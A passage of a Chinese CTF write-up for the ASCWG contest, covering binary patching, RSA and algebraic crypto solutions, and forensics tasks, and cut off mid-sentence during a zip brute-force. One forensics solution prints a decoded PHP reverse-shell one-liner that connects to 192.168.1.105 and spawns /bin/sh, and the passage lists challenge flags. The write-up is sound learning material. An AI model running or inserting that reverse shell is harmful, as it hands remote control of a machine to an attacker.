class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">!=</span> v4<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v4<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v6 <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_44<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v7 <span class="token operator">=</span> v6 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>LABEL_44<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>          v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v12 <span class="token operator">=</span> <span class="token string">"joezid"</span><span class="token punctuation">;</span>        v13 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"joezid"</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v14 <span class="token operator">=</span> <span class="token operator">*</span>v12<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v12 <span class="token operator">!=</span> v12<span class="token punctuation">[</span>v13<span class="token punctuation">]</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v12<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v14 <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_61<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v15 <span class="token operator">=</span> v14 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v12<span class="token punctuation">[</span>v13<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>LABEL_61<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token punctuation">)</span>          v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v33 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      phProv <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      phHash <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>      pdwDataLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span>v51<span class="token punctuation">,</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptAcquireContextW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0xF0000000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptCreateHash</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0x8003u</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>phHash<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptHashData</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> BYTE <span class="token operator">*</span><span class="token punctuation">)</span>lpBuffer<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            pdwDataLen <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptGetHashParam</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> pbData<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"Your Flag is : ASCWG&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> pdwDataLen<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>                <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"%c%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v51<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pbData<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v51<span class="token punctuation">[</span>pbData<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>              v32 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"CryptGetHashParam failed: %d\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">else</span>          <span class="token punctuation">&#123;</span>            <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span>            result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>          <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>LABEL_78<span class="token operator">:</span>      <span class="token function">sub_13F501060</span><span class="token punctuation">(</span><span class="token string">"No Flag for you ,Set Your Heart Ablaze to be able to see the flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了不进入LABEL_78，就必须让v11为0。也就必须让*v8 = v8[v9]。</p><p>而 v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)”bbbbb”。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152227.png" alt="2-2-5"></p><p>(_QWORD)”bbbbb” = 字符串bbbb存放的地址</p><p>v8 = 字符串bbbb存放的地址</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152251.png" alt="2-2-6"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152312.png" alt="2-2-7"></p><p>所以综上分析得出 v8[v9]  = v35。所以，问题只要解决v35是什么。</p><p>v35 = (__int64)&amp;lpBuffer[10 * i + 66] + lpBuffer[15];</p><p>lpBuffer[15] = lpBuffer + 15*4，该地址存放的内容为 0x 0000 0080h</p><p> movsxd  rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据</p><p>(__int64)&amp;lpBuffer[10*i + 66] = 第[10*i + 66]个元素在内存当中的首地址</p><p>但是按照这样的理解，和汇编代码就出现了不一致的情况。</p><p>汇编代码反映出来的是lpBuffer[15+10*i +66]，之所以乘28h，是因为0x28h = 40。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152332.png" alt="2-2-8"></p><p>综合上面的分析呢，</p><p>v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)”bbbbb” = v35 = lpBuffer[15+10*i +66]</p><p>所以可以根据我们就可以去寻找特定位置处的存放的内容，并根据条件判断中的内容进行修改。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152352.png" alt="2-2-9"></p><p>修改完毕之后，再次运行PE_Anatomy程序之后即能显示出来flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152414.png" alt="2-2-10"></p><p>做了这个题，我有个看法但不知道对不对。我觉得汇编当中，凡是涉及到地址的相关计算，到最后都会对应到相应地址中存放的内容。而不是把计算之后的地址进行操作。</p><p>最后对以下在做题中遇到的指令的知识进行补充。</p><p><strong>movzx eax, word ptr [rax]</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152454.png" alt="2-2-11"></p><p><strong>v34 = (char *)lpBuffer + lpBuffer[15];</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152511.png" alt="2-2-12"></p><p>通过对比汇编，可以发现  我之前对lpBuffer[15]的理解有问题。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152532.png" alt="2-2-13"></p><p>正确的理解方式，lpbuffer[15] = lpbuffer + 15*4（至于这里为什么是15*4(0x3C)，是因为本身Ipbuffer 是int*类型的指针，也就是Ipbuffer变量所存储的64位地址指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152553.png" alt="2-2-14"></p><p><strong>a vs. a[0] vs. *a  vs. &amp;a vs. &amp;a[0]</strong></p><p>参考此<a href="https://blog.csdn.net/baidu_37973494/article/details/83148520">帖子</a>.</p><ol><li><p>a，表示数组名；</p><p> a做左值时表示整个数组的所有空间(10×4=40字节)，又因为C语言规定数组操作时要独立单个操作，不能整体操作数组，所以a不能做左值；</p><p> a做右值表示数组首元素的首地址(首元素首地址就是数组的第0个元素的起始地址，也就是a[0]的起始地址)；</p></li><li><p>a[0]，表示数组的首元素，也就是数组的第0个元素；</p><p> a[0]做左值时表示数组第0个元素对应的内存空间（连续4字节）；</p><p> a[0]做右值时表示数组第0个元素的值（也就是数组第0个元素对应的内存空间中存储的那个数）；</p></li><li><p>&amp;a，表示数组名a取地址，字面意思是数组的地址（数组的地址就是数组的首地址，也叫数组的起始地址）</p><p> &amp;a不能做左值，因为&amp;a实质是一个常量，不是变量因此不能赋值，所以自然不能做左值；</p><p> &amp;a做右值时表示整个数组的首地址；</p></li><li><p>&amp;a[0]，字面意思就是数组第0个元素的首地址（搞清楚[]和&amp;的优先级，[]的优先级要高于&amp;，所以a先和[]结合再取地址）；</p><p> &amp;a[0] 做左值时表示数组首元素首地址所对应的内存空间；</p><p> &amp;a[0] 做右值时等同于a。表示数组首元素的首地址；</p></li></ol><h2 id="3-Crypto"><a href="#3-Crypto" class="headerlink" title="3 Crypto"></a>3 <strong>Crypto</strong></h2><h3 id="3-1-RSA-in-the-wild"><a href="#3-1-RSA-in-the-wild" class="headerlink" title="3-1 RSA in the wild"></a>3-1 <strong>RSA in the wild</strong></h3><p>题目提供了以下一段程序和一段程序的输出，题目主要实现了一个 RSA 加密过程，但是其中每个人加密过程中的 N 不同，但是 P 相同，因此 P 是关键问题。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152621.png" alt="3-1-1"></p><p>首先我们得知 N_i = P*Q_i ，因此可以通过 gcd 算法求个最大公约数，进而求得每个 N。在获得 e、p、q 便可以获得 d，再根据 RSA 加密解密算法，C = M^e(mod N)，M = C^d(mod N) 即可求出原始消息，最后将原始消息进行 long_to_bytes 求解即可，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#求解最大公因数方法</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> a<span class="token operator">%</span>b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> b        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token comment"># 这里要注意的是，不知道为什么这四个数字当中两两存在共同的 P 而不是四个数有共同的 P</span><span class="token keyword">import</span> libnumN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9019465093803586877472891652042526017244423267918585684572141459337752636017501282398583984846819147555479788255766221465302452334708306581657478087163498882790399392556915932241903819600243256898710512837026330099749891149718206725456165654975013707057350042189177818505148923810842478214626652504947902299</span><span class="token punctuation">,</span><span class="token number">23938372162005523177999938438562451374665546708075664883194200608993841377868039780046395969369898805670203008718315917149246468698236445400730491330343376568175458641957123986113999188370741703681470314365261825831443108787421922073023609145294588353146041309964285454626205876016177576199911694583578054203</span><span class="token punctuation">,</span><span class="token number">7492176105815056287406737107861152687669914817188441973876375606125509278843647128053495385472184164273276753734355681888283710630052589292533918258041321561584337044160204288159261124250897895150472928088930420119607423773142875636276401786832850472958085716356092462792054479554714349979034664376850407259</span><span class="token punctuation">,</span><span class="token number">19226181445602743460246708025013176246822001005948560833211736039157554695246287037030410489087800335076044816379819628670911825715971233704410525113162113042540729331798511555022529148709471705473637189586448652726834752638590559219127165638752435997278633564685349397058307290548363125722837867180940021419</span><span class="token punctuation">]</span>messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1490803635449005835981793387807741830923148060654731278738509797435451285285034156065878921946571927216460900511251526914548382779631334897120457669789539503101428807041786196779372071069328112093285546177856847259662170258558289415211977744184992082066716124590295955026240499770848142550445898094801157061</span><span class="token punctuation">,</span><span class="token number">6350249974685514311455731678779522359350354799468017596988644954406012738159501505851851861514932395179333372434804220392980343950894714606458923379054304802233466609403548752751709359872922491353578150109676550914201161697356048954377466378161795747517549045847439371181670308693139841054101664947749441303</span><span class="token punctuation">,</span><span class="token number">2544223511735543039595079752083782272939464573374775456475586531619250161960313372895971808675158274512437185309522676978160116122909124405173644335952401335143161289490254404665940426997169777822971888908315046502903142588256830588219713706207832651682400227233863085882991692803261801301182265503150372301</span><span class="token punctuation">,</span><span class="token number">12100625282820382536088469677465402939756857865013288698256765193122801312845842440176118885229553306158666539700152355154084650895509376550887918252093180450562973419960250796728283309496027020169076272415675948089735523228946553123649235016377673362851198236398841047345542435309022329198769047584615575574</span><span class="token punctuation">]</span>E <span class="token operator">=</span> <span class="token number">0x10001</span>P1 <span class="token operator">=</span> gcd<span class="token punctuation">(</span>N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>P2 <span class="token operator">=</span> gcd<span class="token punctuation">(</span>N<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>P <span class="token operator">=</span> <span class="token punctuation">[</span>P1<span class="token punctuation">,</span> P2<span class="token punctuation">,</span> P1<span class="token punctuation">,</span> P2<span class="token punctuation">]</span>Q <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Q<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> c<span class="token punctuation">,</span> n <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span> Q<span class="token punctuation">,</span> messages<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>E <span class="token punctuation">,</span>phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而对所有的进行解码后发现只有一句是有意义的，包含了 flag。</p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;7h3_c0mM0n_9re4t_P0W3r_0f_6r0k3N_R$A&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-OSP"><a href="#3-2-OSP" class="headerlink" title="3-2 OSP"></a>3-2 <strong>OSP</strong></h3><p>题目提供了以下一段程序和一段程序的输出，通过使用 os.urandom 和 getPrime 实现随机的一次一密的加密方式，而解决问题的关键在于我们知道 flag 的格式为 ASCWG{xxx}。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152733.png" alt="3-2-1"></p><p>首先我们知道每一行的输出为 f * p + k，而其中的 p 是固定的，因此我们首先求 p，我们把前三行分别对 65、83、67 进行求取整除法，可以得到可能的 p，接着我们可以得到如下三个数，利用简单的知识便可以得出 p 为第二个数字。</p><pre class="line-numbers language-none"><code class="language-none">8380111610140476221795983343688768916912567646337046868517962485410861365956683801116101404762217959833436887689169125676463370468685179624854108613659563 --&gt; p83801116101404762217959833436887689169125676463370468685179624854108613659565<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>求解出 p 之后，我们将每行分别对 p 求模，便可获得所谓随机的 k 值，进而逆向求解，便可以获得每行所对应的 f，在使用 chr 函数进行转换便可以获得 flag。</p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;Wh47_1f_17&#39;s_N07_@_Pr1M3!-f0ffa3657e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-Teaser-Aha"><a href="#3-3-Teaser-Aha" class="headerlink" title="3-3 Teaser [Aha!]"></a>3-3 <strong>Teaser [Aha!]</strong></h3><p>题目提供了以下一段程序和一段程序的输出，该程序的关键在于先求解 x，接着求解 c1，c2，我们知道 flag 的格式为 ASCWG{xxx}。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152801.png" alt="3-3-1"></p><p>这里我们首先可以利用 sympy 求解 x 的值，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympyhint<span class="token operator">=</span><span class="token number">6573544964235663795110387821358621068738264530355319754834598296204350028845729399053875214556575503920004379593112</span>a<span class="token operator">=</span><span class="token number">12011053116152205388</span>b<span class="token operator">=</span><span class="token number">11423234452039057359</span>x <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>solution <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>x<span class="token operator">**</span><span class="token number">5</span> <span class="token operator">+</span> a<span class="token operator">*</span>b<span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> b<span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token punctuation">(</span>a<span class="token operator">*</span>b<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>b<span class="token operator">*</span>a<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>b<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span>hint <span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># x = 14794740941666750497</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着后面的就是参考了官方的 writeup，其中使用了 <strong>SageMath</strong> 代码如下：</p><pre class="line-numbers language-none"><code class="language-none">F &#x3D; Zmod(N)PR.&lt;c1, c2&gt; &#x3D; PolynomialRing(F)f1 &#x3D; x*a*c1 + b*c2 + a*b - q1f2 &#x3D; a*c2 - x*b*c1 + a*b - q2I &#x3D; Ideal([f1, f2])I.groebner_basis()# [c1 + 129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923, c2 + 16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571]# 接着我们求得了 c1 + 129...(mod N)&#x3D;0 以及 c2 + 163...(mod N) &#x3D;0 进而根据以下内容求解C1 &#x3D; F(-129605315639493448970075136922290937178908733835389122798667679999645002511918751225679112934299574414218902904120640354628679425092067997512344836684845210103107098629862452090849238650480459973169748953515560552426758751304034613294461809691584124214680152686132787281209362547560156811179702797894368189923)C2 &#x3D; F(-16301823837274342549830986630234325738949194338370818370588794724975224426894656835985621236373909782588949334404482254039646785783224270540302423929586850992446342322491817804966558550730248640999810574168456842642895073832374078601103825246815150330281607599953134437905377383158998850822351263862695676571)print(int.to_bytes(int(F(C1*C2)), 64, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;8r4in_T3s$s1n9_7h3_Ba51s_0f_9r036n3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-Forensics"><a href="#4-Forensics" class="headerlink" title="4 Forensics"></a>4 Forensics</h2><h3 id="4-1-warmup-1"><a href="#4-1-warmup-1" class="headerlink" title="4-1 warmup #1"></a>4-1 <strong>warmup #1</strong></h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152836.png" alt="4-1-1"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;7b4be24b7e1f4ef01ebb62fce8fe3470857edaf7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-warmup-2"><a href="#4-2-warmup-2" class="headerlink" title="4-2 warmup #2"></a>4-2 <strong>warmup #2</strong></h3><p>本关是一道jpg图片隐写的题目。首先仔细观察图片，发现上方存在类似于马赛克的图样，猜测是将flag以某种形式编码(url, base64, ascii或者不同进制下的ascii)后直接写入。查看后发现果然是通过url编码的方式把shell命令写入了图片。根据题目的要求把目标地址的sha1sum的哈希值作为flag上传。</p><p>当然出题人的WriteUp是直接使用strings查看图片中的所有字符串，这样也是同样可以的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152858.png" alt="4-2-1"></p><p>url解码后得到： <code>$sock=fsockopen(&quot;192.168.1.105&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152921.png" alt="4-2-2"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;cc0e30c2dc233fc58591c987c4eaf751ff25132b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-WeirdFS"><a href="#4-3-WeirdFS" class="headerlink" title="4-3 WeirdFS"></a>4-3 <strong>WeirdFS</strong></h3><p>本题目给出的一个img镜像文件。首先通过通过fdisk文件查看该硬盘的格式信息，发现时Apple的APFS格式，因此直接在本机上挂载读入。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152945.png" alt="4-3-1">   </p><p>发现了一个有密码的zip文件，其中含有Flag.txt文件。一开始观察zip文件发现其是真加密，并不是考察zip伪加密。所以我们开始打开硬盘下的所有隐藏文件开始寻找zip的密码。但是把所有看似像密码的的字符串尝试后发现都无法打开zip文件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153005.png" alt="4-3-2"></p><p>最后决定爆破zip文件。这里采用的是John the 